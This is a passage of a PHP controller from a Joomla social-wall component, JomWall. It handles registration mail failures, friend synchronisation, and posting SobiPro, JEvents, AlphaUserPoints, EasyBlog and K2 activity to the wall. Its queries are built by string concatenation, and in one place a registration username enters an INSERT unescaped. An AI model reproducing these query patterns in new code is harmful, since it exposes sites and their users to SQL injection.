			// Send mail to all superadministrators id
			foreach( $rows as $row )
			{
				$return = JFactory::getMailer()->sendMail($data['mailfrom'], $data['fromname'], $row->email, $emailSubject, $emailBodyAdmin);

				// Check for an error.
				if ($return !== true) {
					echo(JText::_('COM_USERS_REGISTRATION_ACTIVATION_NOTIFY_SEND_MAIL_FAILED'));
					return false;
				}
			}
		}
		// Check for an error.
		if ($return !== true) {
			echo (JText::_('COM_USERS_REGISTRATION_SEND_MAIL_FAILED'));

			// Send a system message to administrators receiving system mails
			$db = JFactory::getDBO();
			$q = "SELECT id
				FROM #__users
				WHERE block = 0
				AND sendEmail = 1";
			$db->setQuery($q);
			$sendEmail = $db->loadColumn();
			if (count($sendEmail) > 0) {
				$jdate = new JDate();
				// Build the query to add the messages
				$q = "INSERT INTO ".$db->quoteName('#__messages')." (".$db->quoteName('user_id_from').
				", ".$db->quoteName('user_id_to').", ".$db->quoteName('date_time').
				", ".$db->quoteName('subject').", ".$db->quoteName('message').") VALUES ";
				$messages = array();

				foreach ($sendEmail as $userid) {
					$messages[] = "(".$userid.", ".$userid.", '".$jdate->toSql()."', '".JText::_('COM_USERS_MAIL_SEND_FAILURE_SUBJECT')."', '".JText::sprintf('COM_USERS_MAIL_SEND_FAILURE_BODY', $return, $data['username'])."')";
				}
				$q .= implode(',', $messages);
				$db->setQuery($q);
				$db->query();
			}
			return false;
		}
	
		
		if ($useractivation == 1)
			$return	= "useractivate";
		elseif ($useractivation == 2)
			$return	= "adminactivate";
		else
			$return	= $user->id;
			
		if ($return === 'adminactivate'){
			awdwallController::ajaxResponse(JText::_('COM_USERS_REGISTRATION_COMPLETE_VERIFY'));
		} elseif ($return === 'useractivate') {
			awdwallController::ajaxResponse(JText::_('COM_USERS_REGISTRATION_COMPLETE_ACTIVATE'));		
		} else {
			awdwallController::ajaxResponse(JText::_('COM_USERS_REGISTRATION_SAVE_SUCCESS'));	
		}
		exit;		
	
	}
	function getrealtimecomment()
	{
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$itemId = AwdwallHelperUser::getComItemId();
			$db		=& JFactory::getDBO();
			$msgid = JRequest::getInt('msgid', 0);
			$currenttime=time();
			$currenttime=$currenttime-8;
			$wallModel 	= $this->getModel('wall');
			$view  		= &$this->getView('awdwall', 'html');
			$view->setLayout('older_comments_block');
			$view->setModel($wallModel);
			$view->getrealtimecomment();
		exit;
	}	
	function docbfriendsynch()
	{
	
	$db =& JFactory::getDBO();
	$query='SELECT * FROM #__comprofiler_members WHERE accepted=1 and referenceid not in (SELECT connect_from FROM #__awd_connection) or memberid not in (SELECT connect_to FROM #__awd_connection)';
	$db->setQuery($query);
	$cbflist = $db->loadObjectList();
	
	if(count($cbflist))
	{
		foreach($cbflist as $plist)
		{
			$query = 'SELECT count(*) as rowcount FROM #__awd_connection WHERE connect_from='.$plist->referenceid.' and connect_to='.$plist->memberid;
			$db->setQuery($query);
			$rowcount = $db->loadResult();
			if(empty($rowcount) || $rowcount==0) // insert into awd conntecton
			{
				$query = "INSERT INTO #__awd_connection (`connect_from` ,`connect_to` ,`status` ,`pending` ,`msg` ,`created`)
				VALUES ('".$plist->referenceid."', '".$plist->memberid."', '1', '0', NULL , '". time()."')";
				$db->setQuery($query);
				$db->query();
			}
		}
	}
	echo '<h1>'.JText::_( 'Synchronisation Completed.' ).'</h1>';
	exit;
	}
	function docbfrienddeletesynch()
	{
	$db =& JFactory::getDBO();
	$query='SELECT * FROM #__awd_connection WHERE pending=0 and connect_from not in (SELECT referenceid FROM #__comprofiler_members) or connect_to not in (SELECT memberid FROM #__comprofiler_members)';
	$db->setQuery($query);
	$cbflist = $db->loadObjectList();
	
	if(count($cbflist))
	{
		foreach($cbflist as $plist)
		{
			$query = 'SELECT count(*) as rowcount FROM #__comprofiler_members WHERE referenceid='.$plist->connect_from.' and memberid='.$plist->connect_to;
			$db->setQuery($query);
			$rowcount = $db->loadResult();
			if(empty($rowcount) || $rowcount==0) // insert into awd conntecton
			{
				$query = "delete from #__awd_connection where `connect_from`=".$plist->connect_from." and `connect_to`=".$plist->connect_to;
				$db->setQuery($query);
				$db->query();
			}
		}
	}
	echo '<h1>'.JText::_( 'Synchronisation Delete Completed.' ).'</h1>';
	exit;
	}
	function sobiproactivity()
	{
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$itemId = AwdwallHelperUser::getComItemId();
			$db		=& JFactory::getDBO();
			$today=date("Y-m-d H:i:s");
			$config 		= &JComponentHelper::getParams('com_awdwall');
			$sobiproactivity 		= $config->get('sobiproactivity', '0');
			$sql="CREATE TABLE IF NOT EXISTS `#__awd_wall_sobi_act` (
			  `id` int(11) NOT NULL default '1',
			  `lastactivityid` bigint(20) NOT NULL default '0',
			  `lastinactiveids` text NOT NULL default ''
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;";
			$db->setQuery( $sql );
			if (!$db->query())
			{
				return JError::raiseWarning( 500, $db->getError() );
			}
			if($sobiproactivity==1 )
			{
				$query="select lastactivityid from #__awd_wall_sobi_act ";
				$db->SetQuery($query);
				$lastactivityid = $db->loadResult();
				$query="select lastinactiveids from #__awd_wall_sobi_act ";
				$db->SetQuery($query);
				$lastinactiveids = $db->loadResult();
				//echo $lastinactiveids ;
				$query="select count(*) from #__awd_wall_sobi_act ";
				
				$db->SetQuery($query);
				$countrows = $db->loadResult();
				
				if($countrows==0)
				{
					$query="select max(id) from #__sobipro_object where oType='entry' and approved=1 or state=1 ";
					$db->SetQuery($query);
					$lastactivityid = $db->loadResult();
					
					//echo $lastactivityid;
					$query="select id from #__sobipro_object where oType='entry' and approved=0 or state=0 ";
					//echo $query;
					$db->SetQuery($query);
					$lastinactiveids = $db->loadObjectList();
					//print_r($lastinactiveids);
					if($lastinactiveids)
					{
						foreach($lastinactiveids as $xid)
						{
							if($ids=='')
							{
								$ids=$xid->id;
							}
							else
							{
								$ids=$ids.','.$xid->id;
							}
						}
					 	//$ids=implode(',',$lastinactiveids);
					}
					//echo $ids;
					
					$sql="INSERT INTO `#__awd_wall_sobi_act` (`id`, `lastactivityid`,lastinactiveids) VALUES(1, ".$lastactivityid.",'".$ids."');";
					//echo $sql;
					$db->setQuery( $sql );
					if (!$db->query())
					{
						return JError::raiseWarning( 500, $db->getError() );
					}
				}
				
					$query  = "SELECT id FROM #__menu WHERE link like 'index.php?option=com_sobipro%' and published='1' limit 1";
					$db->setQuery($query);
					$sItemid= $db->loadResult();
					
				$query = "SELECT  id from #__sobipro_object where id > ".$lastactivityid ." AND  	approved=1 and oType='entry'  ORDER BY createdTime asc";
				$db->SetQuery($query);
				$sobiactivities = $db->loadObjectList();
				if($sobiactivities)
				{
					for($i=0;$i<count($sobiactivities);$i++)
					{
						$sobi2id=$sobiactivities[$i]->id;
						
						$query="select * from #__sobipro_relations where id=".$sobi2id;
						$db->SetQuery($query);
						$relations = $db->loadObjectList();
						$relation = $relations[0];
						$catid=$relation->pid;
						
						$query="select name from #__sobipro_object where id=".$catid;
						$db->SetQuery($query);
						$catname = $db->loadResult();
						
						$query="select baseData from #__sobipro_field_data where sid=".$sobi2id." and fid=1 limit 1";
						$db->SetQuery($query);
						$baseData = $db->loadResult();
						
						$query="select createdBy from #__sobipro_field_data where sid=".$sobi2id." limit 1";
						$db->SetQuery($query);
						$createdBy = $db->loadResult();
						$href = JRoute::_("index.php?option=com_sobipro&sid=".$sobi2id."&pid=".$catid."&Itemid=".$sItemid, false );
						$cathref = JRoute::_("index.php?option=com_sobipro&sid=".$catid."&Itemid=".$sItemid, false );
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $createdBy;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $createdBy ;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'SOBI_JOMWALL_POST_TITLE', $href,$baseData,$cathref,$catname);
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
					}
				}
						$query="select max(id) from #__sobipro_object where oType='entry' and approved=1 or state=1 ";
						$db->SetQuery($query);
						$lastpostid = $db->loadResult();
						//$sql="INSERT INTO `#__awd_wall_sobi_act` (`id`, `lastactivityid`,lastinactiveids) VALUES(1, ".$lastactivityid.",'".$ids."');"
						$sql="update #__awd_wall_sobi_act set lastactivityid='".$lastpostid."'";
						$db->setQuery( $sql );
						if (!$db->query())
						{
							return JError::raiseWarning( 500, $db->getError() );
						}

				$query="select id from #__sobipro_object where oType='entry' and approved=0 or state=0 ";
				$db->SetQuery($query);
				$lastinactiveids = $db->loadObjectList();
				if($lastinactiveids)
				{
					foreach($lastinactiveids as $xid)
					{
						if($ids=='')
						{
							$ids=$xid->id;
						}
						else
						{
							$ids=$ids.','.$xid->id;
						}
					}
				}
				$sql="update #__awd_wall_sobi_act set lastinactiveids='".$ids."'";
				$db->setQuery( $sql );
				if (!$db->query())
				{
					return JError::raiseWarning( 500, $db->getError() );
				}
				
			}			
		exit;	
			
	}
	function jeventactvity()
	{
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$itemId = AwdwallHelperUser::getComItemId();
			$db		=& JFactory::getDBO();
			$today=date("Y-m-d H:i:s");
			$config 		= &JComponentHelper::getParams('com_awdwall');
			$jeventactvity 		= $config->get('jeventactvity', '0');
			$sql="CREATE TABLE IF NOT EXISTS `#__awd_wall_jevent_act` (
			  `id` int(11) NOT NULL default '1',
			  `lastactivityid` bigint(20) NOT NULL default '0',
			  `lastinactiveids` text NOT NULL default ''
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;";
			$db->setQuery( $sql );
			if (!$db->query())
			{
				return JError::raiseWarning( 500, $db->getError() );
			}
				$query  = "SELECT id FROM #__menu WHERE link like 'index.php?option=com_jevents%' and published='1' limit 1";
				$db->setQuery($query);
				$eItemid= $db->loadResult();
			
			if($jeventactvity==1 )
			{
				$query="select lastactivityid from #__awd_wall_jevent_act ";
				$db->SetQuery($query);
				$lastactivityid = $db->loadResult();
				$query="select lastinactiveids from #__awd_wall_jevent_act ";
				$db->SetQuery($query);
				$lastinactiveids = $db->loadResult();
				$query="select count(*) from #__awd_wall_jevent_act ";
				
				$db->SetQuery($query);
				$countrows = $db->loadResult();
				
				if($countrows==0)
				{
					$query="select max(ev_id) from #__jevents_vevent where  state=1 ";
					$db->SetQuery($query);
					$lastactivityid = $db->loadResult();
					
					//echo $lastactivityid;
					$query="select ev_id from #__jevents_vevent where state=0 ";
					//echo $query;
					$db->SetQuery($query);
					$lastinactiveids = $db->loadObjectList();
					//print_r($lastinactiveids);
					if($lastinactiveids)
					{
						foreach($lastinactiveids as $xid)
						{
							if($ids=='')
							{
								$ids=$xid->ev_id;
							}
							else
							{
								$ids=$ids.','.$xid->ev_id;
							}
						}
					 	//$ids=implode(',',$lastinactiveids);
					}
					//echo $ids;
					
					$sql="INSERT INTO `#__awd_wall_jevent_act` (`id`, `lastactivityid`,lastinactiveids) VALUES(1, ".$lastactivityid.",'".$ids."');";
					//echo $sql;
					$db->setQuery( $sql );
					if (!$db->query())
					{
						return JError::raiseWarning( 500, $db->getError() );
					}
				}
				
					
				$query = "SELECT  ev_id from #__jevents_vevent where ev_id > ".$lastactivityid ." AND  state=1 ";
				//echo $query ;
				$db->SetQuery($query);
				$eventactivities = $db->loadObjectList();
				if($eventactivities)
				{
					for($i=0;$i<count($eventactivities);$i++)
					{
						$eventid=$eventactivities[$i]->ev_id;
						
						$query="select * from #__jevents_vevdetail where evdet_id=".$eventid;
						$db->SetQuery($query);
						$eventdetails = $db->loadObjectList();
						$eventdetail = $eventdetails[0];
						$summary=$eventdetail->summary;
						
						$query="select * from #__jevents_vevent where ev_id=".$eventid;
						$db->SetQuery($query);
						$eventdetails1 = $db->loadObjectList();
						$eventdetail1 = $eventdetails1[0];
						$uid=$eventdetail1->uid;
						$created=$eventdetail1->created;
						$start_datearray=explode(" ",$created);
						$datearray=explode("-",$start_datearray[0]);
						$y=$datearray[0];
						$m=$datearray[1];
						$d=$datearray[2];
						$created_by =$eventdetail1->created_by;
						
						//$href =JRoute::_('index.php?option=com_jevents&task=icalevent.detail&evid=' . $eventid.'&Itemid='.$eItemid.'&year='.$y.'&month='.$m.'&day='.$d.'&title='.$summary.'&uid='.$uid, false);
						$href =JRoute::_('index.php?option=com_jevents&task=icalevent.detail&evid=' . $eventid.'&Itemid='.$eItemid.'&year='.$y.'&month='.$m.'&day='.$d, false);
						//$href =JURI::base()."index.php?option=com_jevents&amp;task=icalevent.detail&amp;evid={$eventid}&amp;Itemid={$eItemid}&amp;year={$y}&amp;month={$m}&amp;day={$d}&amp;title={$summary}&amp;uid={$uid}";
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $created_by;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $created_by;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'JEVENT_JOMWALL_POST_TITLE', $href,$summary);
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
					}
				}
				
				$query="select max(ev_id) from #__jevents_vevent where  state=1 ";
				$db->SetQuery($query);
				$lastpostid = $db->loadResult();
				$sql="update #__awd_wall_jevent_act set lastactivityid='".$lastpostid."'";
				$db->setQuery( $sql );
				if (!$db->query())
				{
					return JError::raiseWarning( 500, $db->getError() );
				}
						
				if($lastinactiveids)
				{
				$query="SELECT  ev_id from #__jevents_vevent where ev_id < ".$lastactivityid ." AND ev_id in (".$lastinactiveids.") and state=0 ";
				$db->SetQuery($query);
				$eventactivities = $db->loadObjectList();
				if($eventactivities)
				{
					for($i=0;$i<count($eventactivities);$i++)
					{
						$eventid=$eventactivities[$i]->ev_id;
						
						$query="select * from #__jevents_vevdetail where evdet_id=".$eventid;
						$db->SetQuery($query);
						$eventdetails = $db->loadObjectList();
						$eventdetail = $eventdetails[0];
						$summary=$eventdetail->summary;
						
						$query="select * from #__jevents_vevent where ev_id=".$eventid;
						$db->SetQuery($query);
						$eventdetails1 = $db->loadObjectList();
						$eventdetail1 = $eventdetails1[0];
						$uid=$eventdetail1->uid;
						$created=$eventdetail1->created;
						$start_datearray=explode(" ",$created);
						$datearray=explode("-",$start_datearray[0]);
						$y=$datearray[0];
						$m=$datearray[1];
						$d=$datearray[2];
						$created_by =$eventdetail1->created_by;
						//$href =JRoute::_('index.php?option=com_jevents&task=icalevent.detail&evid=' . $eventid.'&Itemid='.$eItemid.'&year='.$y.'&month='.$m.'&day='.$d.'&title='.$summary.'&uid='.$uid, false);
						$href =JRoute::_('index.php?option=com_jevents&task=icalevent.detail&evid=' . $eventid.'&Itemid='.$eItemid.'&year='.$y.'&month='.$m.'&day='.$d, false);
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $created_by;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $created_by;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'JEVENT_JOMWALL_POST_TITLE', $href,$summary);
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
					}
				}
				
				$query="select ev_id from #__jevents_vevent where state=0 ";
				$db->SetQuery($query);
				$lastinactiveids = $db->loadObjectList();
				if($lastinactiveids)
				{
					foreach($lastinactiveids as $xid)
					{
						if($ids=='')
						{
							$ids=$xid->ev_id;
						}
						else
						{
							$ids=$ids.','.$xid->ev_id;
						}
					}
				}
				$sql="update #__awd_wall_jevent_act set lastinactiveids='".$ids."'";
				$db->setQuery( $sql );
				if (!$db->query())
				{
					return JError::raiseWarning( 500, $db->getError() );
				}
				
			}
			}			
		exit;	
	}	
	function alphauserpointactivity()
	{
			$awdlang =& JFactory::getLanguage();
			$awdlang->load('com_alphauserpoints', JPATH_SITE, 'en-GB', true);
			$awdlang->load('com_alphauserpoints', JPATH_SITE, $awdlang->getDefault(), true);
			$awdlang->load('com_alphauserpoints', JPATH_SITE, null, true);
			
			jimport('joomla.html.parameter');
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$mainframe=JFactory::getApplication();
			$itemId = AwdwallHelperUser::getComItemId();
			$db		=& JFactory::getDBO();
			$today=date("Y-m-d H:i:s");
			$config 		= &JComponentHelper::getParams('com_awdwall');
			$alphauserpointactivity 		= $config->get('alphauserpointactivity', '0');
			
			
			$sql="CREATE TABLE IF NOT EXISTS `#__awd_wall_alphauser_act` (
			  `id` int(11) NOT NULL default '1',
			  `lastactivityid` bigint(20) NOT NULL default '0'
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;";
			$db->setQuery( $sql );
			if (!$db->query())
			{
				return JError::raiseWarning( 500, $db->getError() );
			}
			
			if($alphauserpointactivity==1 )
			{
				$query="select lastactivityid from #__awd_wall_alphauser_act ";
				$db->SetQuery($query);
				$lastactivityid = $db->loadResult();
				if(empty($lastactivityid)){$lastactivityid=0;}
				$query="select count(*) from #__awd_wall_alphauser_act ";
				$db->SetQuery($query);
				$countrows = $db->loadResult();
				if($countrows==0)
				{
					$query="select max(id) from #__alpha_userpoints ";
					$db->SetQuery($query);
					$lastactivityid = $db->loadResult();
					if(empty($lastactivityid)){$lastactivityid=0;}
					$sql="INSERT INTO `#__awd_wall_alphauser_act` (`id`, `lastactivityid`) VALUES(1, ".$lastactivityid.");";
					//echo $sql;
					$db->setQuery( $sql );
					if (!$db->query())
					{
						return JError::raiseWarning( 500, $db->getError() );
					}
				}
				
		$query = "SELECT a.insert_date, a.referreid, a.points AS last_points, a.datareference,u.id as userid,aup.id, r.rule_name, r.plugin_function, r.category"
			   . " FROM #__alpha_userpoints_details AS a, #__alpha_userpoints AS aup, #__users AS u, #__alpha_userpoints_rules AS r"
			   . " WHERE aup.referreid=a.referreid AND aup.userid=u.id AND aup.published='1' AND a.approved='1' AND aup.id>".$lastactivityid ." AND r.id=a.rule  ORDER BY a.insert_date asc"
		 	   ;
					$db->SetQuery($query);
					$userpointactivities = $db->loadObjectList();
					for($i=0;$i<count($userpointactivities);$i++)
					{
						$userID =$userpointactivities[$i]->userid;
						
						$rule_name=JText::_($userpointactivities[$i]->rule_name);
						$last_points=$userpointactivities[$i]->last_points;
						$userName= AwdwallHelperUser::getDisplayName($userID);
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $userID ;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $userID ;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'ALPHAUSERPOINT_JOMWALL_POST_TITLE', $last_points,$rule_name);
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
					}
					
						$query="select max(id) from #__alpha_userpoints ";
						$db->SetQuery($query);
						$lastactivityid = $db->loadResult();
						$sql="update #__awd_wall_alphauser_act set lastactivityid='".$lastactivityid."'";
						$db->setQuery( $sql );
						if (!$db->query())
						{
							return JError::raiseWarning( 500, $db->getError() );
						}			   
			
			}
			
		exit;	
	}
	
	function geteasyfeedtowall()
	{
		if(file_exists(JPATH_SITE . '/components/com_easyblog/easyblog.php'))
		{
		
			jimport('joomla.html.parameter');
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$mainframe=JFactory::getApplication();
			$itemId = AwdwallHelperUser::getComItemId();
			$db		=& JFactory::getDBO();
			$today=date("Y-m-d H:i:s");
			$config 		= &JComponentHelper::getParams('com_awdwall');
			$avatarintergration 		= $config->get('avatarintergration', '0');
			
			
			$easyblogcomment 		= $config->get('easyblogcomment', '0');
			$easyblogpost 		= $config->get('easyblogpost', '0');
			
			$sql="CREATE TABLE IF NOT EXISTS `#__awd_wall_easyblog_act` (
			  `id` int(11) NOT NULL default '1',
			  `lastcommnentid` bigint(20) NOT NULL default '0',
			  `lastpostid` bigint(20) NOT NULL default '0'
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;";
			$db->setQuery( $sql );
			if (!$db->query())
			{
				return JError::raiseWarning( 500, $db->getError() );
			}
			
			if($easyblogpost==1 || $easyblogcomment==1 )
			{
			
			$query="select id from #__menu  where client_id=0 and link ='index.php?option=com_easyblog&view=latest' order by id  limit 1";
			$db->SetQuery($query);
			$easyblogitemId = $db->loadResult();
			
			$query="select lastcommnentid from #__awd_wall_easyblog_act ";
			$db->SetQuery($query);
			$lastcommnentid = $db->loadResult();
			$query="select lastpostid from #__awd_wall_easyblog_act ";
			$db->SetQuery($query);
			$lastpostid = $db->loadResult();
			if(empty($lastcommnentid)){$lastcommnentid=0;}
			if(empty($lastpostid)){$lastpostid=0;}
			$query="select count(*) from #__awd_wall_easyblog_act ";
			$db->SetQuery($query);
			$countrows = $db->loadResult();
			
			if($countrows==0)
			{
				$query="select max(id) from #__easyblog_comment ";
				$db->SetQuery($query);
				$lastcommnentid = $db->loadResult();
				$query="select max(id) from #__easyblog_post ";
				$db->SetQuery($query);
				$lastpostid = $db->loadResult();
				if(empty($lastcommnentid)){$lastcommnentid=0;}
				if(empty($lastpostid)){$lastpostid=0;}
				$sql="INSERT INTO `#__awd_wall_easyblog_act` (`id`, `lastcommnentid`,`lastpostid`) VALUES(1, ".$lastcommnentid.",".$lastpostid.");";
				$db->setQuery( $sql );
				if (!$db->query())
				{
					return JError::raiseWarning( 500, $db->getError() );
				}
			}
			
				// easy blog post log star here ********************************************
				if($easyblogpost==1)
				{
	
					$query="select * from #__easyblog_post where published=1  and id > ".$lastpostid." order by id desc ";
					//echo $query;
					$db->SetQuery($query);
					$easyblogpostctivities = $db->loadObjectList();

					for($i=0;$i<count($easyblogpostctivities);$i++)
					{
						$userID =$easyblogpostctivities[$i]->created_by;
						$itemID=$easyblogpostctivities[$i]->id;
						
						$userName= AwdwallHelperUser::getDisplayName($userID);
						
						$itemtitle = $easyblogpostctivities[$i]->title;
						$permalink = $easyblogpostctivities[$i]->permalink ;
						$catid = $easyblogpostctivities[$i]->category_id ;
						
						$itemurl='index.php?option=com_easyblog&view=entry&id='.$itemID.'&Itemid='.$easyblogitemId;
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $userID ;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $userID ;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'EASYBLOG_JOMWALL_BLOG_POST_TITLE', '<a href="' . $itemurl . '">' . $itemtitle . '</a>');
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
					}
					
						$query="select max(id) from #__easyblog_post ";
						$db->SetQuery($query);
						$lastpostid = $db->loadResult();
						$sql="update #__awd_wall_easyblog_act set lastpostid='".$lastpostid."'";
						$db->setQuery( $sql );
						if (!$db->query())
						{
							return JError::raiseWarning( 500, $db->getError() );
						}
				} // end of if(easyblogpost==1)
				//  easy blog post log end here ********************************************
			
			
			
			// for easy blog comment activity log *******************************************
			if($easyblogcomment==1)
			{		
			
			
					$query="select * from #__easyblog_comment where published=1  and id > ".$lastcommnentid." order by id desc ";
					//echo $query;
					$db->SetQuery($query);
					$easyblogcommen_activities = $db->loadObjectList();
					//$easyblogcommen_lastactivityid=$lastactivityid;
			
					for($i=0;$i<count($easyblogcommen_activities);$i++)
					{
						$userID =$easyblogcommen_activities[$i]->created_by;
						$itemID=$easyblogcommen_activities[$i]->post_id;
						$parent_id=$easyblogcommen_activities[$i]->parent_id;
						
						$query="select title  from #__easyblog_post where id=".$itemID;
						$db->SetQuery($query);
						$itemtitle = $db->loadResult();

						$itemurl='index.php?option=com_easyblog&view=entry&id='.$itemID.'&Itemid='.$easyblogitemId;
						if($parent_id==0)
						{
							$msg=JText::sprintf ( 'EASYBLOG_JOMWALL_BLOG_POST_COMMENT_TITLE', '<a href="' . $itemurl . '">' . $itemtitle . '</a>');
						}
						else
						{
							$msg=JText::sprintf ( 'EASYBLOG_JOMWALL_BLOG_POST_REPLAY_TITLE', '<a href="' . $itemurl . '">' . $itemtitle . '</a>');
						}
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $userID ;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $userID ;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= $msg;
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
			
					}
					
					$query="select max(id) from #__easyblog_comment ";
					$db->SetQuery($query);
					$lastactivityid = $db->loadResult();
					$sql="update `#__awd_wall_easyblog_act` set `lastcommnentid`='".$lastactivityid."'";
					$db->setQuery( $sql );
					if (!$db->query())
					{
						return JError::raiseWarning( 500, $db->getError() );
					}
				} // end of if($easyblogcomment==1)
				
			//for easy blogcomment activity log end here **************************************************

		
		} // easyblogpost==1 || $easyblogcomment==1
		
	  } // end of if(file_exists(JPATH_SITE . '/components/com_k2/k2.php'))
		
		exit;	
	}
	
	function getk2feedtowall()
	{
		if(file_exists(JPATH_SITE . '/components/com_k2/k2.php'))
		{
		
			jimport('joomla.html.parameter');
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$mainframe=JFactory::getApplication();
			$itemId = AwdwallHelperUser::getComItemId();
			$db		=& JFactory::getDBO();
			$today=date("Y-m-d H:i:s");
			$config 		= &JComponentHelper::getParams('com_awdwall');
			$avatarintergration 		= $config->get('avatarintergration', '0');
			
			$k2comment 		= $config->get('k2comment', '0');
			$k2article 		= $config->get('k2article', '0');
			
			$sql="CREATE TABLE IF NOT EXISTS `#__awd_wall_k2comment_act` (
			  `id` int(11) NOT NULL default '1',
			  `lastactivityid` bigint(20) NOT NULL default '0',
			  `lastk2articleid` bigint(20) NOT NULL default '0'
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;";
			$db->setQuery( $sql );
			if (!$db->query())
			{
				return JError::raiseWarning( 500, $db->getError() );
			}
			
			
			if($k2article==1 || $k2comment==1 )
			{
			
			$query="select id from #__menu  where client_id=0 and link like 'index.php?option=com_k2%' order by id desc limit 1";
			$db->SetQuery($query);
			$k2itemId = $db->loadResult();
			
			$query="select lastactivityid from #__awd_wall_k2comment_act ";
			$db->SetQuery($query);
			$lastactivityid = $db->loadResult();
			$query="select lastk2articleid from #__awd_wall_k2comment_act ";
			$db->SetQuery($query);
			$lastk2articleid = $db->loadResult();
			if(empty($lastk2articleid)){$lastk2articleid=0;}
			if(empty($lastactivityid)){$lastactivityid=0;}
			
			if(empty($lastactivityid)|| empty($lastk2articleid))
			{
				$query="select max(id) from #__k2_comments ";
				$db->SetQuery($query);
				$lastactivityid = $db->loadResult();
				$query="select max(id) from #__k2_items ";
				$db->SetQuery($query);
				$lastk2articleid = $db->loadResult();
				if(empty($lastk2articleid)){$lastk2articleid=0;}
				if(empty($lastactivityid)){$lastactivityid=0;}
				$sql="INSERT INTO `#__awd_wall_k2comment_act` (`id`, `lastactivityid`,`lastk2articleid`) VALUES(1, ".$lastactivityid.",".$lastk2articleid.");";
				$db->setQuery( $sql );
				if (!$db->query())
				{
					return JError::raiseWarning( 500, $db->getError() );
				}
			}
			
				// k2 article log star here ********************************************
				if($k2article==1)
				{
	
					$query="select * from #__k2_items where published=1  and access=1 and id > ".$lastk2articleid." order by id desc ";
					//echo $query;
					$db->SetQuery($query);
					$k2_articleactivities = $db->loadObjectList();
					$k2_lastarticleid=$lastk2articleid;
			
					for($i=0;$i<count($k2_articleactivities);$i++)
					{
						$userID =$k2_articleactivities[$i]->created_by;
						$itemID=$k2_articleactivities[$i]->id;
						
						$userName= AwdwallHelperUser::getDisplayName($userID);
						
						$itemtitle = $k2_articleactivities[$i]->title;
						$alias = $k2_articleactivities[$i]->alias;
						$catid = $k2_articleactivities[$i]->catid;
						
						$itemurl='index.php?option=com_k2&view=item&id='.$itemID.':'.$alias.'&Itemid='.$k2itemId;
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $userID ;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $userID ;
